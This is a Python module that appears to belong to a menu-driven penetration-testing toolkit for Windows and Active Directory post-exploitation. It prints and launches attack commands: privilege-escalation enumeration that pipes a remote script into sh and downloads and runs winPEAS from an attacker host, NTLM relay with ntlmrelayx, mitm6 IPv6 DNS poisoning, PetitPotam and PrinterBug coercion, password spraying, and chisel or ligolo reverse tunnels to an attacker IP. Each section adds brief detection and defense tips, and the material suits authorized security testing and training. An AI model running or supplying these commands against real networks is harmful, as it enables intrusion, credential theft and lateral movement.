from __future__ import annotations

from rich.prompt import Prompt

from .utils import console, header, pause, resolve_tool, run_tool


def _find(*names: str) -> str | None:
    for n in names:
        if resolve_tool(n):
            return n
    return None


def privesc_enum() -> None:
    header("Privilege-escalation enum", "Commands to run ON a foothold to find privesc")
    console.print("[bold]Linux (run on the target):[/]")
    for c in [
        "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
        "sudo -l                         # sudo rights (check GTFOBins for each)",
        "find / -perm -4000 -type f 2>/dev/null   # SUID binaries",
        "getcap -r / 2>/dev/null         # capabilities",
        "cat /etc/crontab; ls -la /etc/cron.*     # scheduled jobs",
        "find / -writable -type d 2>/dev/null     # writable dirs",
    ]:
        console.print(f"  [green]{c}[/]")
    console.print("\n[bold]Windows (run on the target):[/]")
    for c in [
        "iwr -uri http://YOU/winPEASx64.exe -o wp.exe; .\\wp.exe",
        "whoami /priv                    # SeImpersonate -> Potato attacks",
        "systeminfo                      # missing patches",
        "reg query HKLM\\...\\Winlogon    # autologon creds",
    ]:
        console.print(f"  [green]{c}[/]")
    console.print("\n[bright_black]Cross-reference SUID/sudo results with LOLBins (l) and "
                  "GTFOBins. Serve winPEAS with the HTTP Interceptor file server (h -> 2).[/]")
    console.print("[bright_black]detection: winPEAS/linPEAS are noisy — EDR flags the mass "
                  "enumeration; monitor for unexpected process trees off web/service accounts.[/]")
    pause()


def ntlm_relay() -> None:
    header("NTLM relay", "Relay coerced auth to SMB/LDAP (ntlmrelayx)")
    tool = _find("impacket-ntlmrelayx", "ntlmrelayx.py", "ntlmrelayx")
    if not tool:
        console.print("[yellow]ntlmrelayx not found[/] (part of impacket) — "
                      "[cyan]pipx install impacket[/]")
        return pause()
    targets = Prompt.ask("Target (e.g. smb://10.0.0.5 or ldap://dc01)")
    console.print("[dim]Pair with responder or mitm6 to coerce authentication to you.[/]")
    run_tool(tool, ["-t", targets, "-smb2support"])
    console.print("\n[bright_black]detection & defense: enforce SMB signing and LDAP "
                  "channel binding/signing — that neuters relay entirely. Watch for auth "
                  "from a host to many others in quick succession.[/]")
    pause()


def password_spray() -> None:
    header("Password spray", "One password vs many users (lockout-aware). Authorized only.")
    tool = _find("nxc", "netexec", "crackmapexec", "kerbrute")
    if not tool:
        console.print("[yellow]netexec/kerbrute not found[/] — [cyan]pipx install netexec[/]")
        return pause()
    target = Prompt.ask("DC / target (IP or domain)")
    users = Prompt.ask("Username list path")
    pw = Prompt.ask("Single password to spray (e.g. Spring2024!)")
    console.print("[yellow]Spray ONE password, then wait out the lockout window before the "
                  "next — check the policy first (nxc smb <dc> --pass-pol).[/]")
    if Prompt.ask("Proceed?", choices=["y", "n"], default="n") != "y":
        return pause()
    if tool == "kerbrute":
        run_tool("kerbrute", ["passwordspray", "-d", target, users, pw], wsl_pathify={2})
    else:
        run_tool(tool, ["smb", target, "-u", users, "-p", pw, "--continue-on-success"],
                 wsl_pathify={3})
    console.print("\n[bright_black]detection: Event ID 4625 (failed logon) spread across "
                  "many accounts from one source in a short window; 4771/4768 for Kerberos "
                  "spray. Alert on failure-count-by-source, not by-account.[/]")
    pause()


def mitm6_attack() -> None:
    header("mitm6", "IPv6 DNS takeover -> relay to LDAP/S (Windows prefers IPv6)")
    if not _find("mitm6"):
        console.print("[yellow]mitm6 not found[/] — [cyan]pipx install mitm6[/]")
        return pause()
    domain = Prompt.ask("Target domain (e.g. corp.local)")
    console.print("[dim]Two terminals — mitm6 poisons IPv6 DNS, ntlmrelayx catches the auth:[/]")
    console.print(f"  [green]mitm6 -d {domain}[/]")
    console.print(f"  [green]ntlmrelayx.py -6 -t ldaps://<dc> -wh fakewpad.{domain} "
                  "--delegate-access[/]")
    if Prompt.ask("\nStart mitm6 now?", choices=["y", "n"], default="n") != "y":
        return pause()
    run_tool("mitm6", ["-d", domain])
    console.print("\n[bright_black]detection/defense: disable IPv6 if unused, or set DHCPv6 "
                  "guard; watch for rogue DHCPv6 replies and WPAD lookups.[/]")
    pause()


def pivot() -> None:
    header("Pivoting / tunneling", "Reach internal networks through a foothold")
    you = Prompt.ask("Your (attacker) IP", default="10.10.10.10")
    console.print("\n[bold]chisel (SOCKS proxy through the foothold):[/]")
    console.print("  [dim]# on you:[/]     [green]chisel server -p 8000 --reverse[/]")
    console.print(f"  [dim]# on target:[/]  [green]chisel client {you}:8000 R:1080:socks[/]")
    console.print("  [dim]# then:[/]       [green]proxychains nmap -sT 172.16.0.0/24[/]")
    console.print("\n[bold]ligolo-ng (tun interface, faster):[/]")
    console.print("  [dim]# on you:[/]     [green]ligolo-proxy -selfcert -laddr 0.0.0.0:11601[/]")
    console.print(f"  [dim]# on target:[/]  [green]agent -connect {you}:11601 -ignore-cert[/]")
    console.print("\n[bold]SSH (if you have creds):[/]")
    console.print("  [green]ssh -D 1080 user@foothold   # dynamic SOCKS[/]")
    console.print("\n[bright_black]detection: long-lived outbound connections from servers, "
                  "SOCKS traffic patterns, and non-standard ports from internal hosts.[/]")
    pause()


def coercion() -> None:
    header("Authentication coercion", "Force a host to auth to you (feed the relay)")
    console.print("[dim]Start ntlmrelayx (option 2) or responder first, then coerce:[/]\n")
    console.print("[bold]PetitPotam (MS-EFSRPC):[/]")
    console.print("  [green]petitpotam.py -u user -p pass <YOU> <TARGET-DC>[/]")
    console.print("\n[bold]PrinterBug (MS-RPRN):[/]")
    console.print("  [green]printerbug.py domain/user:pass@<TARGET> <YOU>[/]")
    console.print("\n[bold]Coercer (all methods):[/]")
    console.print("  [green]coercer coerce -u user -p pass -t <TARGET> -l <YOU>[/]")
    console.print("\n[bright_black]Chain: coerce DC -> relay to ADCS web enroll (ESC8) or "
                  "LDAP -> DA. Patch with the PetitPotam/PrintNightmare KBs + disable "
                  "unused RPC.[/]")
    pause()


def token_manip_guide() -> None:
    header("Token Manipulation Guide")
    console.print("Windows token manipulation for post-exploitation.\n")
    techniques = [
        "MakeToken: Create token with explicit creds (logon type 9)",
        "StealToken: Duplicate token from process by PID",
        "ImpersonateToken: Use delegated token from another session",
        "RevToSelf: Revert to original process token",
        "Potato attacks: JuicyPotato/RoguePotato/PrintSpoofer → SYSTEM",
        "Check: whoami /priv → look for SeImpersonatePrivilege",
        "Tools: Incognito, Cobalt Strike, Sliver, Meterpreter incognito",
    ]
    for t in techniques:
        console.print(f"  [cyan]{t}[/]")
    pause()


MENU = {
    "1": ("Privilege-escalation enum", privesc_enum),
    "2": ("NTLM relay (ntlmrelayx)", ntlm_relay),
    "3": ("mitm6 IPv6 takeover", mitm6_attack),
    "4": ("Coercion (PetitPotam/printerbug)", coercion),
    "5": ("Password spray (lockout-aware)", password_spray),
    "6": ("Pivoting / tunneling", pivot),
    "7": ("Token manipulation guide", token_manip_guide),
}
